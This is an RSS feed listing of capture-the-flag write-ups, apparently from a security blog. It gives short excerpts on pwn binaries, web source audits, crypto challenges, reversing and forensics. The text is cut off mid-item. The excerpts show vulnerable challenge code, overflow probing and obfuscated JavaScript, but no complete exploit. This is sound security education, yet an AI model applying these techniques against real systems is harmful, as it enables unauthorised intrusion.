$ glibc/ld-linux-x86-64.so.2 glibc/libc.so.6 GNU C Library (GNU libc) stable release version 2.30. Copyright (C) 2019 Free Software Foundation, Inc. This is free software; see the source for copying conditions. There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.</description></item><item><title>Dream Diary: Chapter 3</title><link>https://7rocky.github.io/en/ctf/htb-challenges/pwn/dream-diary-chapter-3/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/pwn/dream-diary-chapter-3/</guid><description>We are given a 64-bit binary called diary3:
Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled RUNPATH: b'./' Moreover, we also have the remote Glibc library and loader:
$ ./ld-2.29.so libc.so.6 GNU C Library (Ubuntu GLIBC 2.31-0ubuntu9.9) stable release version 2.31. Copyright (C) 2020 Free Software Foundation, Inc. This is free software; see the source for copying conditions. There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.</description></item><item><title>E.Tree</title><link>https://7rocky.github.io/en/ctf/htb-challenges/web/e.tree/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/web/e.tree/</guid><description>We are given this website:
We are also given the source code of the project in Python (Flask).
Source code analysis The application has three endpoints in blueprints/routes.py:
from flask import Blueprint, render_template, request from application.util import leaderboard, search_staff web = Blueprint('web', __name__) api = Blueprint('api', __name__) @web.route('/') def index(): return render_template('index.html') @web.route('/leaderboard') def web_leaderboard(): return render_template('leaderboard.html', leaderboard=leaderboard('DSC-N-1547')) @api.route('/search', methods=['POST']) def api_search(): name = request.json.get('search', '') return search_staff(name) The relevant one is /search, which calls a function search_staff that is defined in util.</description></item><item><title>Easy DSA: Elated once</title><link>https://7rocky.github.io/en/ctf/imaginaryctf/easy-dsa-elated-once/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/imaginaryctf/easy-dsa-elated-once/</guid><description>We are given the Python source code used to encrypt the flag:
from Crypto.Util.Padding import pad from Crypto.Util.number import isPrime, getPrime, long_to_bytes from Crypto.Cipher import AES from hashlib import sha256 from random import randrange def H(msg): return int.from_bytes(sha256(msg).digest(), 'big') def gen_key(): p = 0 while not isPrime(p): q = getPrime(300) p = 2*q + 1 g = randrange(2, p)**2 % p x = randrange(2, q) y = pow(g, x, p) return p, q, g, x, y def gen_nonces(): a = randrange(2, q) b = randrange(2, q) k = 0 while 1: k = (a*k + b) % q yield k def sign(m): k = next(nonces) r = pow(g, k, p) % q s = (H(m) + x*r) * pow(k, -1, q) % q return r, s def verify(m, r, s): assert 0 &amp;lt; r &amp;lt; q and 0 &amp;lt; s &amp;lt; q u = pow(s, -1, q) v = pow(g, H(m) * u, p) * pow(y, r * u, p) % p % q return v == r flag = b"</description></item><item><title>Easy DSA: Lovely Little Lane</title><link>https://7rocky.github.io/en/ctf/imaginaryctf/easy-dsa-lovely-little-lane/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/imaginaryctf/easy-dsa-lovely-little-lane/</guid><description>We are given the Python source code used to encrypt the flag:
from Crypto.Util.Padding import pad from Crypto.Util.number import isPrime, getPrime, long_to_bytes from Crypto.Cipher import AES from hashlib import sha256 from random import randrange def gen_key(): p = 0 while not isPrime(p): q = getPrime(300) p = 2*q + 1 g = randrange(2, p)**2 % p x = randrange(2, q) y = pow(g, x, p) return p, q, g, x, y def H(msg): return int.</description></item><item><title>Easy DSA: The beginning</title><link>https://7rocky.github.io/en/ctf/imaginaryctf/easy-dsa-the-beginning/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/imaginaryctf/easy-dsa-the-beginning/</guid><description>We are given the Python source code used to encrypt the flag:
from Crypto.Util.Padding import pad from Crypto.Util.number import isPrime, getPrime, long_to_bytes from Crypto.Cipher import AES from hashlib import sha256 from random import randrange def gen_key(): p = 0 while not isPrime(p): q = getPrime(300) p = 2*q + 1 g = randrange(2, p)**2 % p k = randrange(2, q) x = randrange(2, q) y = pow(g, x, p) return p, q, g, x, y, k def H(msg): return int.</description></item><item><title>Easy Phish</title><link>https://7rocky.github.io/en/ctf/htb-challenges/osint/easy-phish/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/osint/easy-phish/</guid><description>We have this challenge description:
Customers of secure-startup.com have been recieving some very convincing phishing emails, can you figure out why?
DNS enumeration First, we can try to enumerate secure-startup.com using several DNS records (more information here) and dig.
The TXT record outputs a part of the flag:
$ dig secure-startup.com TXT ; &amp;lt;&amp;lt;&amp;gt;&amp;gt; DiG 9.10.6 &amp;lt;&amp;lt;&amp;gt;&amp;gt; secure-startup.com TXT ;; global options: +cmd ;; Got answer: ;; -&amp;gt;&amp;gt;HEADER&amp;lt;&amp;lt;- opcode: QUERY, status: NOERROR, id: 48771 ;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1 ;; OPT PSEUDOSECTION: ; EDNS: version: 0, flags:; udp: 4096 ;; QUESTION SECTION: ;secure-startup.</description></item><item><title>Eat the Cake!</title><link>https://7rocky.github.io/en/ctf/htb-challenges/reversing/eat-the-cake/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/reversing/eat-the-cake/</guid><description>We have a Windows PE called cake.exe:
$ file cake.exe cake.exe: PE32 executable (console) Intel 80386, for MS Windows, UPX compressed Decompression As can be seen, it is compressed with UPX, so let&amp;rsquo;s decompress it:
$ upx -d cake.exe Ultimate Packer for eXecutables Copyright (C) 1996 - 2023 UPX 4.0.2 Markus Oberhumer, Laszlo Molnar &amp; John Reiser Jan 30th 2023 File size Ratio Format Name -------------------- ------ ----------- ----------- 15872 &amp;lt;- 9216 58.</description></item><item><title>Ebola Virus</title><link>https://7rocky.github.io/en/ctf/htb-challenges/crypto/ebola-virus/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/crypto/ebola-virus/</guid><description>We are given these two files:
$ cat key.txt CTGAAATGTTCCGCGAGCCGAACCGATTCACCGCCTAGAAACGTATTGTGCTGGTGTGCGGCGGTTAGAGATATTAGGTAGCGCCGTTACTCTAACATTTCGAATCAACCTTTCAGGGGAGTCACTGCCATCGTAAGTAGAGTACTTAGCATCGATGGCCATGCCTACTAATTACAGGCTGAATGACACTAAACCTTAGTTCACTGACCCGTTTTGTCATGTACTCTTGTGGTATGGGTCTTCAAATTGATCTGATTGGGAAGATAGAAAAACGGCTCTATCCTGGGTCGAGCCTCCCATGAAGCAGTCAAGGGGCCGCGAGGACTTCGATACTTGCCCTGCTCGAGCACATTTTAAAGCTTATTCCACATACTAGACTTACCCCCCGGCGTGTCGTACTGGAAGGTTAAACCTCTTGAGTTGATCTGACAACCTAGACGCGTGCCACGTTGTGTGGGATAGGTCACTCTCATTTCCACGAGGGACCAGAACCTTTGGCAATCCAGTTATTCTGCACTCGTGGCCGCCTCTCCTGGCAGGGGACCGGTAAGTTTGCGTATTCGCCGGGGAGTGGAGACGGATCGTCGTACACTGTTTCGAAAATTTTTGAGGATGGAGAGCAGAGCTATTGGATAAACGCTTGTACAGGTTCAATACTATTAGCAACGTGCCACCGGCACAGCTATCTCTGTTTCGCATGAAAGAGCCGTTAATCACGACGTTTAATCGAAACACATACCGATGGTCTACGAATATTATATCCGATACTAAGTCGGCCGCCGCAGTCCAGACGCCATATCGCTTTGAAGACCCCAAGGCGAACATTAACCGGTACGAGCAACTGCGGAGTGCCCTGCAATAGTCCGTCTGTAAAGGGCCCAGGCTAGGGCAAATAGTCCCTAAAACTAGAGATGGTCAACCGCTATGTGGGGCATTCTCCGTGAGACTCAGCCGTATTACAGTGAGCGTATTCCCAAACTCCCCTTCTGTGTATGACCAGTGTCGCTGCAAATGGACCGAGCAG $ xxd encrypted.bin 00000000: f3d3 8309 0748 15ee b309 8144 5dea a409 .....H.....D]... 00000010: 26b3 eaa4 83a4 09b3 6e09 b326 ea75 8323 &amp;.......n..&amp;.u.# 00000020: 09a4 835d 4415 eaa4 0944 eeee 6e83 a4a4 ...]D....D..n... 00000030: 0967 d344 26d3 0944 a409 154f 7583 6e09 .g.D&amp;..D...Ou.n. 00000040: 4fb3 75b3 ee09 444f 09ea 6e75 5d83 b375 O.u...DO..nu]..u 00000050: 83c3 f009 0748 15ee b309 8144 5dea a409 .</description></item><item><title>echoland</title><link>https://7rocky.github.io/en/ctf/htb-challenges/pwn/echoland/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/pwn/echoland/</guid><description>We are given a remote instance to connect to. At first glance, it seems to be vulnerable to Buffer Overflow:
$ nc 206.189.21.29 32084 🦇 Inside the dark cave. 🦇 1. Scream. 2. Run outside. > 1 >> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA /home/ctf/run_challenge.sh: line 2: 30 Segmentation fault ./echoland Ncat: Broken pipe. And there is no stack canary because *** stack smashing detected *** does not appear as error message. But it also has a Format String vulnerability:</description></item><item><title>El cifrao del cuñao</title><link>https://7rocky.github.io/en/ctf/other/hackon-ctf/el-cifrao-del-cu%C3%B1ao/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/hackon-ctf/el-cifrao-del-cu%C3%B1ao/</guid><description>We are provided with a Python script that encrypts the flag with RSA:
from Crypto.Util.number import getPrime, bytes_to_long import random flag='HackOn{testing_flag}' p = getPrime(1024) q = getPrime(1024) r = getPrime(24) N1 = p * q * r N = p * q e1 = 34456075732829756714431696264844933736161425428678777444326530245267175496676105 e2 = 66213320562378389542956020292848603326457400359492442893037745994906793456536650 c1 = pow(7 * p + random.randint(N,N1) * q, e1, N) c2 = pow(5 * p + random.randint(2,N) * q, e2, N) print (f'N1: {N1}\ne1: {e1}\ne2: {e2}\nc1: {c1}\nc2: {c2}') flag_enc= pow(bytes_to_long(flag.</description></item><item><title>El Reset de 1745</title><link>https://7rocky.github.io/en/ctf/other/hackon-ctf/el-reset-de-1745/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/hackon-ctf/el-reset-de-1745/</guid><description>We are provided with a Python script that creates a private RSA key and gives us some additional information:
from Crypto.PublicKey import RSA from Crypto.Util.number import getPrime,inverse from sage.all import cos,floor,sqrt def main(): p = getPrime(1024) q = getPrime(1024) N = p*q print(N,q &amp;gt;&amp;gt; 450) print(cos(q &amp;gt;&amp;gt; 450).n(4096)) # -0.83677025469083783941541701752761854754793836436580928644247008941810266469532458996045447348443859400152817824525738732652478723578550322419681449352934903962868272432839950443728133311767399079690030001079242722034971856216464693298008475334803612328029119715730610948114017183466860376219520135065944451843458471230390067711216822465611823803314088335568327990572989813880317949003496128817743756941657517592732976171161188449564836856703887590653409218974871687234942350215936871374265782174012360582549759635891009261305443677350659234691411334888094583016691447506478413851786692210332884103069291530840376504431016357464401672842279159473862600445695092589720790836314505433051945268839223026728538635526261735680020640125514694922387865117641745486767737807560114356069413145843513030254057578430063498955558945235100024577603060294061771113596755818633721728098654211982059793050427304804021628754473574523763161349682175284850419236582818156064980865716476145483816198034274679778084438576624517718459301374217997767985615596748052223448537502912453071556058736828589970943263917953424626006378389407199956646994682638376389500968564930356704561568053846692273026900362154710217069324829901876963571359354949212621973636284 e = 0x10001 priv = RSA.construct((p*q, e, inverse(e, (p - 1) * (q - 1)))) with open("priv.pem",'wb') as f: f.write(priv.exportKey('PEM')) if __name__ == '__main__': main() In addition, we have a PCAP file with encrypted TLS 1.</description></item><item><title>ElElGamal</title><link>https://7rocky.github.io/en/ctf/htb-challenges/crypto/elelgamal/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/crypto/elelgamal/</guid><description>We have this challenge description:
After some minor warnings from IDS, you decide to check the logs to see if anything suspicious is happening. Surprised by what you see, you realize that one of your honeypots has been compromised with a cryptominer. As you look at the processes, you discover a backdoor attached to one of them. The backdoor retrieves the private key from the /key route of a C2. It establishes a session by sending an encrypted initialization sequence.</description></item><item><title>Elliptic Labyrinth</title><link>https://7rocky.github.io/en/ctf/htb-challenges/crypto/elliptic-labyrinth/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/crypto/elliptic-labyrinth/</guid><description>We are provided with the server source code in Python:
import os, json from hashlib import sha256 from random import randint from Crypto.Util.number import getPrime, long_to_bytes from Crypto.Cipher import AES from Crypto.Util.Padding import pad from secret import FLAG class ECC: def __init__(self, bits): while True: self.p = getPrime(bits) if self.p % 4 == 3: break self.a = randint(1, self.p) self.b = randint(1, self.p) def gen_random_point(self): x = randint(2, self.p-2) return (x, pow(x**3 + self.</description></item><item><title>Elliptic Labyrinth</title><link>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/elliptic-labyrinth/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/elliptic-labyrinth/</guid><description>We are provided with the server source code in Python:
import os, json from hashlib import sha256 from random import randint from Crypto.Util.number import getPrime, long_to_bytes from Crypto.Cipher import AES from Crypto.Util.Padding import pad from sage.all_cmdline import * from secret import FLAG class ECC: def __init__(self, bits): self.p = getPrime(bits) self.a = randint(1, self.p) self.b = randint(1, self.p) def gen_random_point(self): return EllipticCurve(GF(self.p), [self.a, self.b]).random_point() def menu(): print("1. Get parameters of path"</description></item><item><title>Elliptic Labyrinth Revenge</title><link>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/elliptic-labyrinth-revenge/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/elliptic-labyrinth-revenge/</guid><description>This challenge is Elliptic Labyrinth modified to force CTF players use the intended way to solve the challenge.
Finding differences The provided source code is a bit different:
import os, json from hashlib import sha256 from random import randint from Crypto.Util.number import getPrime, long_to_bytes from Crypto.Cipher import AES from Crypto.Util.Padding import pad from sage.all_cmdline import * from secret import FLAG class ECC: def __init__(self, bits): self.p = getPrime(bits) self.a = randint(1, self.</description></item><item><title>Emdee five for life</title><link>https://7rocky.github.io/en/ctf/htb-challenges/misc/emdee-five-for-life/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/misc/emdee-five-for-life/</guid><description>We have this website:
It seems that we need to compute the MD5 hash of the string and submit it:
$ echo -n Vzf9GeB5zAFDZ2M3oKSa | md5sum c03463878fee34e249962c4aef9af84c - But we were too slow&amp;hellip;
Hence we will need to script our solution in order to send the request as quick as possible. One important thing to keep in mind is to preserve the PHPSESSID cookie set by the server:
$ curl -I 134.</description></item><item><title>emoji voting</title><link>https://7rocky.github.io/en/ctf/htb-challenges/web/emoji-voting/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/web/emoji-voting/</guid><description>We are given this website:
We are also given the source code of the project in Node.js (Express).
Source code analysis The available endpoints are in routes/index.js:
const path = require('path'); const express = require('express'); const router = express.Router(); let db; const response = data =&amp;gt; ({ message: data }); router.get('/', (req, res) =&amp;gt; { return res.sendFile(path.resolve('views/index.html')); }); router.post('/api/vote', (req, res) =&amp;gt; { let { id } = req.body; if (id) { return db.</description></item><item><title>EncodedPayload</title><link>https://7rocky.github.io/en/ctf/other/hackthebooctf/encodedpayload/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/hackthebooctf/encodedpayload/</guid><description>We are given a binary file called encodedpayload:
$ file encodedpayload encodedpayload: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, no section header Reverse engineering If we execute it, there&amp;rsquo;s nothing shown. Moreover, the binary is very short:
$ ./encodedpayload $ xxd encodedpayload 00000000: 7f45 4c46 0101 0100 0000 0000 0000 0000 .ELF............ 00000010: 0200 0300 0100 0000 5480 0408 3400 0000 ........T...4... 00000020: 0000 0000 0000 0000 3400 2000 0100 0000 .</description></item><item><title>Encryption Master</title><link>https://7rocky.github.io/en/ctf/ctflearn/cryptography/encryption-master/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/ctflearn/cryptography/encryption-master/</guid><description>We are given this text:
This is NOT going to be fun. TmljZSEgTm93IGtlZXAgZ29pbmcuIDU0Nzc2ZjIwNmQ2ZjcyNjUyZTIwMzEzMDMwMzAzMTMxMzAyMDMxMzEzMDMxMzAzMDMxMjAzMTMxMzAzMTMxMzEzMDIwMzEzMTMwMzAzMDMwMzEyMDMxMzEzMDMxMzEzMDMwMjAzMTMwMzAzMDMwMzAyMDMxMzAzMDMwMzEzMDMwMjAzMTMxMzAzMDMxMzAzMTIwMzEzMTMwMzAzMDMxMzEyMDMxMzEzMTMwMzAzMTMwMjAzMTMxMzEzMTMwMzAzMTIwMzEzMTMxMzAzMDMwMzAyMDMxMzEzMTMwMzEzMDMwMjAzMTMxMzAzMTMwMzAzMTIwMzEzMTMwMzEzMTMxMzEyMDMxMzEzMDMxMzEzMTMwMjAzMTMwMzAzMDMwMzEyMDMxMzAzMDMwMzAzMDIwMzEzMDMxMzAzMDMwMzEyMDMxMzEzMDMwMzAzMTIwMzEzMDMxMzAzMDMxMzAyMDMxMzAzMDMwMzEzMTMxMjAzMTMxMzAzMDMwMzEzMDIwMzEzMDMwMzAzMTMxMzEyMDMxMzAzMTMwMzEzMTMwMjAzMTMxMzAzMTMwMzAzMDIwMzEzMTMwMzAzMDMxMzEyMDMxMzEzMDMxMzEzMDMxMjAzMTMxMzAzMTMwMzEyMDMxMzEzMDMxMzEzMTIwMzEzMDMxMzAzMDMxMzEyMDMxMzAzMTMwMzEzMTMwMjAzMTMxMzEzMDMwMzEyMDMxMzAzMDMwMzAzMTMwMjAzMTMwMzEzMDMxMzAzMDIwMzEzMDMxMzAzMTMxMzAyMDMxMzEzMTMwMzAzMTIwMzEzMDMxMzAzMDMwMzEyMDMxMzAzMTMwMzEzMDMxMjAzMTMxMzAzMTMwMzEzMTIwMzEzMTMxMzAzMDMxMjAzMTMwMzEzMDMxMzEzMDIwMzEzMDMxMzAzMDMxMzAyMDMxMzAzMDMwMzEzMTMwMjAzMTMxMzEzMDMwMzEyMDMxMzAzMTMwMzAzMDMwMjAzMTMwMzEzMDMwMzEzMDIwMzEzMTMwMzEzMTMwMzAyMDMxMzEzMTMwMzAzMTIwMzEzMDMxMzEzMDMxMzAyMDMxMzAzMTMwMzEzMDMwMjAzMTMxMzAzMDMwMzEyMDMxMzAzMTMwMzEzMTMwMjAzMTMxMzEzMDMwMzE= We see a large string that is encoded in Base64. If we decode it we get another text:
$ data=TmljZSEgTm93IGtlZXAgZ29pbmcuIDU0Nzc2ZjIwNmQ2ZjcyNjUyZTIwMzEzMDMwMzAzMTMxMzAyMDMxMzEzMDMxMzAzMDMxMjAzMTMxMzAzMTMxMzEzMDIwMzEzMTMwMzAzMDMwMzEyMDMxMzEzMDMxMzEzMDMwMjAzMTMwMzAzMDMwMzAyMDMxMzAzMDMwMzEzMDMwMjAzMTMxMzAzMDMxMzAzMTIwMzEzMTMwMzAzMDMxMzEyMDMxMzEzMTMwMzAzMTMwMjAzMTMxMzEzMTMwMzAzMTIwMzEzMTMxMzAzMDMwMzAyMDMxMzEzMTMwMzEzMDMwMjAzMTMxMzAzMTMwMzAzMTIwMzEzMTMwMzEzMTMxMzEyMDMxMzEzMDMxMzEzMTMwMjAzMTMwMzAzMDMwMzEyMDMxMzAzMDMwMzAzMDIwMzEzMDMxMzAzMDMwMzEyMDMxMzEzMDMwMzAzMTIwMzEzMDMxMzAzMDMxMzAyMDMxMzAzMDMwMzEzMTMxMjAzMTMxMzAzMDMwMzEzMDIwMzEzMDMwMzAzMTMxMzEyMDMxMzAzMTMwMzEzMTMwMjAzMTMxMzAzMTMwMzAzMDIwMzEzMTMwMzAzMDMxMzEyMDMxMzEzMDMxMzEzMDMxMjAzMTMxMzAzMTMwMzEyMDMxMzEzMDMxMzEzMTIwMzEzMDMxMzAzMDMxMzEyMDMxMzAzMTMwMzEzMTMwMjAzMTMxMzEzMDMwMzEyMDMxMzAzMDMwMzAzMTMwMjAzMTMwMzEzMDMxMzAzMDIwMzEzMDMxMzAzMTMxMzAyMDMxMzEzMTMwMzAzMTIwMzEzMDMxMzAzMDMwMzEyMDMxMzAzMTMwMzEzMDMxMjAzMTMxMzAzMTMwMzEzMTIwMzEzMTMxMzAzMDMxMjAzMTMwMzEzMDMxMzEzMDIwMzEzMDMxMzAzMDMxMzAyMDMxMzAzMDMwMzEzMTMwMjAzMTMxMzEzMDMwMzEyMDMxMzAzMTMwMzAzMDMwMjAzMTMwMzEzMDMwMzEzMDIwMzEzMTMwMzEzMTMwMzAyMDMxMzEzMTMwMzAzMTIwMzEzMDMxMzEzMDMxMzAyMDMxMzAzMTMwMzEzMDMwMjAzMTMxMzAzMDMwMzEyMDMxMzAzMTMwMzEzMTMwMjAzMTMxMzEzMDMwMzE= $ echo $data | base64 -d Nice! Now keep going. 54776f206d6f72652ehis time it seems like hexadecimal data. Let&amp;rsquo;s decode it again:
$ data=54776f206d6f72652eecho $data | xxd -r -p Two more. 1000110 1101001 1101110 1100001 1101100 100000 1000100 1100101 1100011 1110010 1111001 1110000 1110100 1101001 1101111 1101110 100001 100000 1010001 110001 1010010 1000111 1100010 1000111 1010110 1101000 1100011 1101101 110101 110111 1010011 1010110 111001 1000010 1010100 1010110 111001 1010001 1010101 1101011 111001 1010110 1010010 1000110 111001 1010000 1010010 1101100 111001 1011010 1010100 110001 1010110 111001 And now we have binary data.</description></item><item><title>Enhance!</title><link>https://7rocky.github.io/en/ctf/picoctf/forensics/enhance/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/picoctf/forensics/enhance/</guid><description>We have a file called drawing.flag.svg that has an image in SVG format:
At first glance, we don&amp;rsquo;t see anything, but if we inspect the XML code inside the SVG file, we will see the flag characters:
&amp;lt;?xml version="1.0" encoding="UTF-8" standalone="no"?&amp;gt; &amp;lt;!-- Created with Inkscape (http://www.inkscape.org/) --&amp;gt; &amp;lt;svg xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:cc="http://creativecommons.org/ns#" xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#" xmlns:svg="http://www.w3.org/2000/svg" xmlns="http://www.w3.org/2000/svg" xmlns:sodipodi="http://sodipodi.sourceforge.net/DTD/sodipodi-0.dtd" xmlns:inkscape="http://www.inkscape.org/namespaces/inkscape" width="210mm" height="297mm" viewBox="0 0 210 297" version="1.1" id="svg8" inkscape:version="0.92.5 (2060ec1f9f, 2020-04-08)" sodipodi:docname="drawing.svg"&amp;gt; &amp;lt;defs id="defs2" /&amp;gt; &amp;lt;sodipodi:namedview id="</description></item><item><title>Enormous</title><link>https://7rocky.github.io/en/ctf/imaginaryctf/enourmous/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/imaginaryctf/enourmous/</guid><description>We are given the Python source code used to encrypt the flag:
#!/usr/bin/env python3 from Crypto.Util.number import * m = bytes_to_long(open('flag.txt', 'rb').read()) n = 1 for i in range(5): n *= getPrime(2025) e = 31 c = pow(m, e, n) print(f'{n = }') print(f'{c = }') And we have the ciphertext $c$ and the modulus $n$ of the RSA implementation. Notice that $e = 31$ is very small and $n$ is very large.</description></item><item><title>Entity</title><link>https://7rocky.github.io/en/ctf/htb-challenges/pwn/entity/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/pwn/entity/</guid><description>We are given a 64-bit binary called chall:
Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled If we connect to the remote instance, we see this:
$ nc 134.122.106.203 30576 Something strange is coming out of the TV.. (T)ry to turn it off (R)un (C)ry &amp;gt;&amp;gt; Nothing really explanatory&amp;hellip;
Static code analysis This time, we are given the original C source code (chall.c):</description></item><item><title>Entity</title><link>https://7rocky.github.io/en/ctf/other/hackthebooctf/entity/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/hackthebooctf/entity/</guid><description>We are given a 64-bit binary called chall:
Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled If we connect to the remote instance, we see this:
$ nc 134.122.106.203 30576 Something strange is coming out of the TV.. (T)ry to turn it off (R)un (C)ry &amp;gt;&amp;gt; Nothing really explanatory&amp;hellip;
Static code analysis This time, we are given the original C source code (chall.c):</description></item><item><title>Eternal Loop</title><link>https://7rocky.github.io/en/ctf/htb-challenges/misc/eternal-loop/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/misc/eternal-loop/</guid><description>We are given a ZIP file called Eternal Loop.zip:
$ file Eternal\ Loop.zip Eternal Loop.zip: Zip archive data, at least v2.0 to extract, compression method=store $ du -h Eternal\ Loop.zip 452K	Eternal Loop.zip $ unzip -v Eternal\ Loop.zip Archive: Eternal Loop.zip Length Method Size Cmpr Date Time CRC-32 Name -------- ------ ------- ---- ---------- ----- -------- ---- 460611 Stored 460611 0% 05-23-2018 01:03 b74de99a 37366.zip -------- ------- --- ------- 460611 460611 0% 1 file Decompressing archives The ZIP archive can be decompressed with password hacktkebox:</description></item><item><title>Evaluation Deck</title><link>https://7rocky.github.io/en/ctf/other/hackthebooctf/evaluation-deck/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/hackthebooctf/evaluation-deck/</guid><description>We are given this website:
However, the web UI is not that interesting&amp;hellip;
Static code analysis We also have the source code. The web application is built with Flask in Python. The following file is application/blueprints/routes.py:
from flask import Blueprint, render_template, request from application.util import response web = Blueprint('web', __name__) api = Blueprint('api', __name__) @web.route('/') def index(): return render_template('index.html') @api.route('/get_health', methods=['POST']) def count(): if not request.is_json: return response('Invalid JSON!'), 400 data = request.</description></item><item><title>Event Horizon</title><link>https://7rocky.github.io/en/ctf/htb-challenges/forensics/event-horizon/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/forensics/event-horizon/</guid><description>We have this challenge description:
Our CEO&amp;rsquo;s computer was compromised in a phishing attack. The attackers took care to clear the PowerShell logs, so we don&amp;rsquo;t know what they executed. Can you help us?
And we are given a lot of log files:
$ ls -l total 0 drwxrwxr-x 325 root root 10400 Nov 2 2020 Logs drwxrwxr-x 2 root root 64 Sep 15 2018 TraceFormat $ find . . .</description></item><item><title>Exif</title><link>https://7rocky.github.io/en/ctf/ctflearn/forensics/exif/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/ctflearn/forensics/exif/</guid><description>We are told to find the flag in this image:
However, the flag is not visible inside the image and it is not hidden in its content. However, we can find the flag in the file metadata.
We can extract metadata using exiftool:
$ exiftool Computer-Password-Security-Hacker\ -\ Copy.jpg ExifTool Version Number : 12.30 File Name : Computer-Password-Security-Hacker - Copy.jpg Directory : . File Size : 54 KiB File Modification Date/Time : - File Access Date/Time : - File Inode Change Date/Time : - File Permissions : -rw-r--r-- File Type : JPEG File Type Extension : jpg MIME Type : image/jpeg JFIF Version : 1.</description></item><item><title>ExploitedStream</title><link>https://7rocky.github.io/en/ctf/htb-challenges/misc/exploitedstream/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/misc/exploitedstream/</guid><description>We are given an obfuscated JavaScript file called exploitedstream.js. If we do a basic formatting, we have this code:
var _0x1d30 = [ 'utf8', 'final', 'cGFzc3dvcmRfaXNfdGhlX25hbWVfb2Zfb25lX25wbV9wYWNrYWdl', 'length', 'charAt', 'charCodeAt', 'slice', 'replace', 'substring', '83729c4575f56a8287c0b4e8ee5c33f8cb891ccaddcafb71ef5f7bd067f19d854ab16e0cb22460', 'xor', 'argv', 'log', 'crypto', 'aes-256-ctr', 'createDecipher', 'update', 'hex' ] ;(function (_0x428798, _0x4aa2b6) { var _0x365e1c = function (_0x400e3c) { while (--_0x400e3c) { _0x428798['push'](_0x428798['shift']()) } } _0x365e1c(++_0x4aa2b6) })(_0x1d30, 0x151) var _0x124e = function (_0x55d687, _0x1fe12d) { _0x55d687 = _0x55d687 - 0x0 var _0x4c9c20 = _0x1d30[_0x55d687] return _0x4c9c20 } try { var crypto = require(_0x124e('0x0')), algorithm = _0x124e('0x1') let password_length = 0x12 function decrypt(_0x4450ef, _0x98789e, _0x26b154) { var _0x4d3ebf = crypto[_0x124e('0x2')](_0x98789e, _0x26b154) var _0x589f03 = _0x4d3ebf[_0x124e('0x3')]( _0x4450ef, _0x124e('0x4'), _0x124e('0x5') ) _0x589f03 += 